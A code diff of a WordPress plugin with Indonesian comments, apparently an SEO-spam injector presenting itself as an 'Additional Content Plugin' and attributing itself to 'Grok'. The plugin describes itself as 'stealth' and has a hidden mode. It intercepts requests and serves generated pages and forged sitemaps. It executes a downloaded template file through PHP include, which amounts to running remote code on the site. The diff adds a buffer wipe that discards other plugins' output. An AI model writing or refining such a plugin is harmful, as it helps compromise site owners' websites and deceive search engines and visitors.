@@ -1,8 +1,8 @@
 <?php
 /*
 Plugin Name: Additional Content Plugin
-Description: Plugin konten & sitemap stealth dengan metode Native Include (Max Performance).
-Version: 7.2
+Description: Plugin konten & sitemap stealth dengan Buffer Cleaner (Anti-XML Error).
+Version: 7.3
 Author: Grok
 */
 
@@ -66,7 +66,17 @@ function acp_nuclear_intercept() {
     }
 }
 
+// FUNGSI PEMBERSIH BUFFER (SOLUSI ERROR XML LINE 2)
+function acp_clean_output_buffer() {
+    // Hapus semua output sebelumnya (spasi/enter dari plugin lain)
+    while (ob_get_level()) {
+        ob_end_clean();
+    }
+}
+
 function acp_render_sitemap_index() {
+    acp_clean_output_buffer(); // BERSIHKAN DULU!
+
     if (!headers_sent()) {
         header('HTTP/1.1 200 OK');
         header('Content-Type: application/xml; charset=utf-8');
@@ -94,6 +104,8 @@ function acp_render_sitemap_index() {
 }
 
 function acp_render_child_sitemap($endpoint, $page) {
+    acp_clean_output_buffer(); // BERSIHKAN DULU!
+
     if (!headers_sent()) {
         header('HTTP/1.1 200 OK');
         header('Content-Type: application/xml; charset=utf-8');
@@ -225,7 +237,7 @@ function acp_admin_page() {
     $main_sitemap_url = home_url(ACP_MAIN_SITEMAP);
     ?>
     <div class="wrap">
-        <h1>Content Plugin (V7.2 Native Include)</h1>
+        <h1>Content Plugin (V7.3 Buffer Clean)</h1>
         <?php if ($is_hidden): ?><div class="notice notice-error"><p>MODE STEALTH AKTIF</p></div><?php endif; ?>
         
         <div style="background:#fff; padding:15px; border-left:4px solid #00a0d2; margin-bottom:20px; display:flex; justify-content:space-between; align-items:center;">
@@ -295,23 +307,18 @@ function acp_display_content() {
     $title = sanitize_text_field(urldecode($val));
     if (get_page_by_path($title, OBJECT, ['post', 'page'])) return;
 
-    // Cek Template Lokal
     $template_path = acp_get_storage_dir() . '/template.txt';
-    if (!file_exists($template_path)) return; // Stop jika template belum didownload
+    if (!file_exists($template_path)) return;
 
     $endpoints = get_option('acp_endpoints', []);
     foreach ($endpoints as $ep) {
         if (!isset($ep['status']) || $ep['status'] !== 'active') continue;
         
-        // Cek JSON Lokal
         $data = acp_get_local_json($ep['json_filename']);
         if (is_array($data)) {
             foreach ($data as $k => $v) {
                 if (strtolower($k) === strtolower($title)) {
-                    $additional_content = $v; // Variabel ini akan dibaca oleh file template di bawah
-                    
-                    // GANTI EVAL DENGAN INCLUDE
-                    // Jauh lebih cepat & aman
+                    $additional_content = $v;
                     include $template_path;
                     exit;
                 }
@@ -319,3 +326,4 @@ function acp_display_content() {
         }
     }
 }
+// Note: Tidak ada tag penutup PHP di akhir untuk mencegah injeksi whitespace
